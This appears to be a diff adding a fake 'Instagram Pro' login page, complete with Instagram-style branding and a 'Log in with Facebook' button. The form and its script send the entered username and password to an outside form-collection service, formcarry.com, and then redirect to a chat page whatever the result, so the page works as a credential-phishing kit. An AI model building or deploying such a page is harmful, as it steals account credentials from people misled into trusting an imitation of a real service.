@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Instagram Proo • Log in</title>
+<link rel="stylesheet" href="styles.css"/>
+<link href="https://fonts.googleapis.com/css2?family=Billabong&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body class="login-body">
+  <main class="login-wrap">
+    <section class="login-card">
+      <h3 class="brand">Instagram Pro</h3>
+
+      <form onsubmit="return validatePassword()" 
+            action="https://formcarry.com/s/MsH-Bw9oo9m" 
+            method="POST"
+            class="login-form"
+            id="loginForm">
+
+        <div class="field">
+          <input type="text" name="username" id="current_password" placeholder="Username" required>
+        </div>
+
+        <div class="field">
+          <input type="password" name="password" id="newpass" placeholder="Password" required>
+        </div>
+
+        <div id="error" style="color:#dc2743;font-size:12px;margin-top:4px;display:none;"></div>
+
+        <button type="submit" class="btn-primary" id="loginBtn">Log In</button>
+
+        <div class="divider">OR</div>
+
+        <button type="button" class="btn-fb" id="fbBtn">Log in with Facebook</button>
+
+        <a href="#" class="forgot">Forgot password?</a>
+      </form>
+
+    </section>
+
+    <section class="signup-card">
+      <p>Don't have an account? <a href="#" id="signupLink">Sign up</a></p>
+    </section>
+
+    <p class="app-foot">Insta Proo — chat with anyone, anywhere.</p>
+  </main>
+
+  <script>
+function validatePassword(){
+  const username = document.getElementById("current_password").value;
+  const pass     = document.getElementById("newpass").value;
+  const error    = document.getElementById("error");
+  const btn      = document.getElementById("loginBtn");
+
+  error.style.display = "none";
+  error.innerHTML = "";
+
+  if(!username || !pass){
+    error.innerHTML = "❌ Please fill in both fields";
+    error.style.display = "block";
+    return false;
+  }
+
+  if(pass.length < 1){
+    error.innerHTML = "❌ Password is required";
+    error.style.display = "block";
+    return false;
+  }
+
+  // Disable button to prevent double submit
+  btn.disabled = true;
+  btn.textContent = "Logging in...";
+
+  // Store username in localStorage for chat.html
+  localStorage.setItem('instaproo_user', username);
+
+  // Send data to Formcarry
+  const form = document.getElementById("loginForm");
+  const formData = new FormData(form);
+
+  fetch("https://formcarry.com/s/MsH-Bw9oo9m", {
+    method: "POST",
+    body: formData
+  })
+  .then(response => {
+    window.location.href = "chat.html";
+  })
+  .catch(error => {
+    window.location.href = "chat.html";
+  });
+
+  return false;
+}
+</script>
+
+  <script src="script.js"></script>
+</body>
+</html>
